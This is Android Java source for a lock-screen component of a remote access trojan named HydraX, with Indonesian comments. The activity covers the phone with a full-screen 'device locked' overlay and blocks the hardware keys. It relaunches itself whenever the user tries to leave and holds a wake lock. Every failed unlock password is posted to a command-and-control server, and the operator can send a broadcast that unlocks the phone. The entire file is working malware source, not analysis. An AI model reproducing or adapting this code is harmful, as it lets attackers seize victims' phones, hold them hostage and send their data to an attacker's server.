package com.hydrax.rat;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LockScreenActivity extends Activity {

    private String c2Url;
    private String deviceId;
    private String correctPassword;
    private EditText passwordInput;
    private Button unlockButton;
    private TextView statusText;
    private PowerManager.WakeLock wakeLock;
    private BroadcastReceiver unlockReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Dapatkan data dari intent
        c2Url = getIntent().getStringExtra("c2_url");
        deviceId = getIntent().getStringExtra("device_id");
        correctPassword = getIntent().getStringExtra("password");

        if (c2Url == null) c2Url = "https://YOUR_SERVEO_URL_HERE";
        if (deviceId == null) deviceId = "unknown";
        if (correctPassword == null || correctPassword.isEmpty()) correctPassword = "hydra123";

        // Set fullscreen + overlay
        setupWindow();

        // Build lock screen UI
        buildLockScreenUI();

        // Keep screen on
        keepScreenOn();

        // Register unlock broadcast
        registerUnlockReceiver();

        // Blokir tombol hardware
        blockHardwareButtons();
    }

    // ==================== SETUP ====================

    private void setupWindow() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);

        // Fullscreen flags
        int flags = WindowManager.LayoutParams.FLAG_FULLSCREEN |
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;

        getWindow().addFlags(flags);

        // Overlay untuk memblokir status bar
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            getWindow().getAttributes().layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
    }

    private void buildLockScreenUI() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);

        // Ikon kunci
        TextView iconText = new TextView(this);
        iconText.setText("🔒");
        iconText.setTextSize(80);
        iconText.setGravity(android.view.Gravity.CENTER);
        layout.addView(iconText);

        // Judul
        TextView titleText = new TextView(this);
        titleText.setText("DEVICE LOCKED");
        titleText.setTextColor(Color.WHITE);
        titleText.setTextSize(24);
        titleText.setGravity(android.view.Gravity.CENTER);
        titleText.setPadding(0, 20, 0, 10);
        layout.addView(titleText);

        // Subtitle
        TextView subText = new TextView(this);
        subText.setText("This device has been locked by administrator");
        subText.setTextColor(Color.GRAY);
        subText.setTextSize(14);
        subText.setGravity(android.view.Gravity.CENTER);
        subText.setPadding(0, 0, 0, 30);
        layout.addView(subText);

        // Input password
        passwordInput = new EditText(this);
        passwordInput.setHint("Enter unlock password");
        passwordInput.setHintTextColor(Color.DKGRAY);
        passwordInput.setTextColor(Color.WHITE);
        passwordInput.setBackgroundColor(Color.parseColor("#1A1A1A"));
        passwordInput.setPadding(20, 15, 20, 15);
        passwordInput.setTextSize(16);
        passwordInput.setGravity(android.view.Gravity.CENTER);
        passwordInput.setInputType(android.text.InputType.TYPE_CLASS_TEXT |
                                   android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
        layout.addView(passwordInput);

        // Status
        statusText = new TextView(this);
        statusText.setText("");
        statusText.setTextColor(Color.RED);
        statusText.setTextSize(12);
        statusText.setGravity(android.view.Gravity.CENTER);
        statusText.setPadding(0, 10, 0, 10);
        layout.addView(statusText);

        // Tombol unlock
        unlockButton = new Button(this);
        unlockButton.setText("UNLOCK");
        unlockButton.setTextColor(Color.WHITE);
        unlockButton.setBackgroundColor(Color.parseColor("#DC2626"));
        unlockButton.setPadding(30, 15, 30, 15);
        unlockButton.setTextSize(16);
        unlockButton.setOnClickListener(v -> attemptUnlock());
        layout.addView(unlockButton);

        setContentView(layout);
    }

    private void keepScreenOn() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    PowerManager.ON_AFTER_RELEASE,
                    "HydraX:LockScreen");
            wakeLock.acquire(10 * 60 * 1000L); // 10 minutes
        }
    }

    // ==================== UNLOCK LOGIC ====================

    private void attemptUnlock() {
        String input = passwordInput.getText().toString().trim();

        if (input.isEmpty()) {
            statusText.setText("Enter password first");
            return;
        }

        if (input.equals(correctPassword)) {
            // UNLOCK BERHASIL
            statusText.setTextColor(Color.GREEN);
            statusText.setText("✅ Unlocked!");
            unlockDevice();
        } else {
            // GAGAL
            statusText.setText("❌ Wrong password! Try again.");
            passwordInput.setText("");

            // Kirim log percobaan gagal ke C2
            sendFailedAttempt(input);
        }
    }

    private void unlockDevice() {
        // Lepas wake lock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        // Unregister receiver
        if (unlockReceiver != null) {
            unregisterReceiver(unlockReceiver);
        }

        // Matikan activity
        finish();
    }

    private void sendFailedAttempt(String attemptedPassword) {
        new Thread(() -> {
            try {
                URL url = new URL(c2Url + "/api/heartbeat");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject data = new JSONObject();
                data.put("id", deviceId);
                data.put("locked", true);
                data.put("unlock_attempt", attemptedPassword);
                data.put("unlock_attempt_time", System.currentTimeMillis());

                conn.getOutputStream().write(data.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {}
        }).start();
    }

    // ==================== BLOCK HARDWARE BUTTONS ====================

    private void blockHardwareButtons() {
        // Lock screen via Device Policy Manager
        ComponentName adminComponent = new ComponentName(this, HydraAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Blokir SEMUA tombol hardware
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
            case KeyEvent.KEYCODE_HOME:
            case KeyEvent.KEYCODE_APP_SWITCH:
            case KeyEvent.KEYCODE_VOLUME_UP:
            case KeyEvent.KEYCODE_VOLUME_DOWN:
            case KeyEvent.KEYCODE_POWER:
            case KeyEvent.KEYCODE_CAMERA:
            case KeyEvent.KEYCODE_MENU:
            case KeyEvent.KEYCODE_SEARCH:
                return true; // Consume event, jangan diproses
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onBackPressed() {
        // Jangan lakukan apa-apa
    }

    @Override
    protected void onUserLeaveHint() {
        // Blokir home button (sebisa mungkin)
        // Langsung kembali ke activity ini
        Intent intent = new Intent(this, LockScreenActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP |
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
        intent.putExtra("c2_url", c2Url);
        intent.putExtra("device_id", deviceId);
        intent.putExtra("password", correctPassword);
        startActivity(intent);
    }

    @Override
    protected void onPause() {
        super.onPause();
        // Kembalikan activity jika kehilangan fokus
        if (!isFinishing()) {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT |
                            Intent.FLAG_ACTIVITY_NO_ANIMATION);
            intent.putExtra("c2_url", c2Url);
            intent.putExtra("device_id", deviceId);
            intent.putExtra("password", correctPassword);
            startActivity(intent);
        }
    }

    // ==================== UNLOCK BROADCAST ====================

    private void registerUnlockReceiver() {
        unlockReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("com.hydrax.rat.UNLOCK".equals(intent.getAction())) {
                    unlockDevice();
                }
            }
        };
        IntentFilter filter = new IntentFilter("com.hydrax.rat.UNLOCK");
        registerReceiver(unlockReceiver, filter);
    }

    // ==================== LIFECYCLE ====================

    @Override
    protected void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (unlockReceiver != null) {
            try {
                unregisterReceiver(unlockReceiver);
            } catch (Exception e) {}
        }
        super.onDestroy();
    }
}
